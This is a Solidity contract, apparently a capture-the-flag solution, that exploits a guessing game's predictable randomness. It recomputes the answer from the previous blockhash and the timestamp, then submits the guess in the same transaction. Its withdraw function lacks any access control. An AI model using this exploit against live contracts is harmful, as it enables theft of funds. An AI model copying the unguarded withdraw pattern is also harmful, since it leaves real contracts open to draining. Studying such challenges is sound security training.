/**
 *Submitted for verification at Etherscan.io on 2021-10-27
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract GuessTheNewNuber{
    
    uint8 public myAnswer;

    function calculAnswer(address _contract) payable public {
        myAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1),block.timestamp))));
        (bool succes,) = _contract.call{value : msg.value}(
            abi.encodeWithSignature("guess(uint8)",myAnswer)
        );
        require(succes);
    }
    
    function withdraw(address payable _myAdress) public {
        _myAdress.transfer(address(this).balance);
    }
}